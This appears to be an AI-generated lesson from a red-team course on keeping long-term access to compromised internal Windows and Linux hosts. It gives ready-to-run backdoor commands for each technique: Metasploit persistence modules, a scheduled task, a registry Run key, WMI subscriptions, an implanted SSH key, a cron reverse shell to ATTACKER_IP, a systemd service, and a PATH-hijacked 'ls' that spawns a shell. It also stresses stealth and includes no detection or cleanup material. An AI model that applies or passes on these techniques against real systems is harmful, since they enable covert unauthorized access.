### _Week 09 — Internal Network Exploitation & Lateral Movement_

**Estimated Time:** 120–180 minutes  
**Difficulty:** Advanced  
**Tools:** Meterpreter, Metasploit Framework, Windows & Linux persistence modules, scheduled tasks, registry modifications, SSH keys, cron jobs, proxychains

---

## **1. Purpose of This Lab**

This lab teaches you how to **maintain long‑term access** to compromised internal hosts after gaining SYSTEM/root privileges.

By the end of this lab, you will be able to:

- Establish Windows persistence (registry, services, scheduled tasks)
- Establish Linux persistence (SSH keys, cron jobs, systemd services)
- Use Meterpreter persistence modules
- Create stealthy backdoors
- Validate persistence after reboot
- Document persistence mechanisms for red‑team style operations

This is the final lab of Week 09 and prepares you for Week 10’s Active Directory exploitation.

---

## **2. Pre‑Lab Requirements**

You must have:

- Completed **Lab 9.4 (Credential Harvesting & Lateral Movement)**
- Completed **Lab 9.5 (Privilege Escalation)**
- SYSTEM or root access on at least one internal host
- A working pivot chain
- SOCKS proxy + proxychains configured

Example topology:

```
Kali → (Pivot Host) → Internal Host A (SYSTEM/root) → Persistence
```

---

## **3. Lab Tasks**

---

# **SECTION A — WINDOWS PERSISTENCE**

---

# **Task 1 — Create a Persistent Meterpreter Service**

### **Objective**

Install a Windows service that automatically launches a Meterpreter payload.

### **Steps**

```
use exploit/windows/local/persistence_service
set SESSION 2
set STARTUP SYSTEM
run
```

### **What to Observe**

- A new Windows service is created
- It launches a reverse shell on boot

### **Deliverable**

A note confirming service‑based persistence.

---

# **Task 2 — Create a Scheduled Task Backdoor**

### **Objective**

Use Windows Task Scheduler to maintain access.

### **Steps**

```
use exploit/windows/local/persistence
set SESSION 2
set STARTUP USER
run
```

Or manually:

```
schtasks /create /tn "Updater" /tr "C:\Windows\Temp\rev.exe" /sc minute /mo 5
```

### **What to Observe**

- Scheduled task runs every 5 minutes
- Reverse shell triggers repeatedly

### **Deliverable**

A note confirming scheduled task persistence.

---

# **Task 3 — Registry Run Key Persistence**

### **Objective**

Add a malicious executable to Windows startup.

### **Steps**

From Meterpreter:

```
reg setval -k HKCU\Software\Microsoft\Windows\CurrentVersion\Run -v updater -d "C:\Windows\Temp\rev.exe"
```

### **What to Observe**

- Payload executes on user login
- Stealthy persistence

### **Deliverable**

A note confirming registry persistence.

---

# **Task 4 — WMI Event Subscription Persistence**

### **Objective**

Use WMI to trigger payload execution on system events.

### **Steps**

Use Metasploit:

```
use exploit/windows/local/wmi_persistence
set SESSION 2
run
```

### **What to Observe**

- Payload triggers on system events
- Harder to detect than registry keys

### **Deliverable**

A note confirming WMI persistence.

---

# **Task 5 — Validate Windows Persistence After Reboot**

### **Objective**

Ensure persistence mechanisms survive reboot.

### **Steps**

1. Reboot the internal host.
2. Wait for callback.
3. Confirm new Meterpreter session appears.

### **Deliverable**

A note confirming persistence survived reboot.

---

---

# **SECTION B — LINUX PERSISTENCE**

---

# **Task 6 — Install SSH Key for Passwordless Access**

### **Objective**

Use SSH keys to maintain access.

### **Steps**

From Meterpreter:

```
shell
mkdir -p ~/.ssh
echo "<your public key>" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

### **What to Observe**

- SSH login works without password
- Persistence survives reboot

### **Deliverable**

A note confirming SSH key persistence.

---

# **Task 7 — Create a Cron Job Backdoor**

### **Objective**

Use cron to execute a reverse shell periodically.

### **Steps**

Edit crontab:

```
crontab -e
```

Add:

```
*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

### **What to Observe**

- Reverse shell every 5 minutes
- Works even if user logs out

### **Deliverable**

A note confirming cron‑based persistence.

---

# **Task 8 — Create a systemd Service Backdoor**

### **Objective**

Install a persistent systemd service.

### **Steps**

Create service file:

```
nano /etc/systemd/system/updater.service
```

Add:

```
[Unit]
Description=Updater Service

[Service]
ExecStart=/usr/bin/bash /root/rev.sh

[Install]
WantedBy=multi-user.target
```

Enable:

```
systemctl enable updater
systemctl start updater
```

### **What to Observe**

- Reverse shell on boot
- Very stealthy

### **Deliverable**

A note confirming systemd persistence.

---

# **Task 9 — Replace a Legitimate Binary (PATH Hijacking)**

### **Objective**

Abuse writable directories in PATH.

### **Steps**

Check PATH:

```
echo $PATH
```

If `/usr/local/bin` is writable:

```
echo "/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > /usr/local/bin/ls
chmod +x /usr/local/bin/ls
```

### **What to Observe**

- Running `ls` triggers reverse shell
- Works for any user who runs the command

### **Deliverable**

A note confirming PATH hijacking persistence.

---

# **Task 10 — Validate Linux Persistence After Reboot**

### **Objective**

Ensure persistence mechanisms survive reboot.

### **Steps**

1. Reboot the internal host.
2. Wait for callback.
3. Confirm new shell appears.

### **Deliverable**

A note confirming persistence survived reboot.

---

---

# **Task 11 — Build a Full Persistence Map**

### **Objective**

Document all persistence mechanisms installed.

### **Include:**

- Windows services
- Scheduled tasks
- Registry keys
- WMI subscriptions
- Linux SSH keys
- Cron jobs
- systemd services
- PATH hijacking
- Any stealth backdoors

### **Deliverable**

A complete persistence map in your Obsidian vault.

---

## **4. Completion Criteria**

You have completed Lab 9.6 when you can:

- Install Windows persistence (services, registry, WMI, scheduled tasks)
- Install Linux persistence (SSH keys, cron, systemd, PATH hijacking)
- Validate persistence after reboot
- Document all persistence mechanisms
- Maintain long‑term access to internal hosts

---

## **5. Next Steps**

When you’re ready, say:

**“Next lab.”**

And I’ll generate **Lab 9.7 — Pivoting Into Additional Subnets (Advanced Multi‑Layer Pivoting)** in the same course style.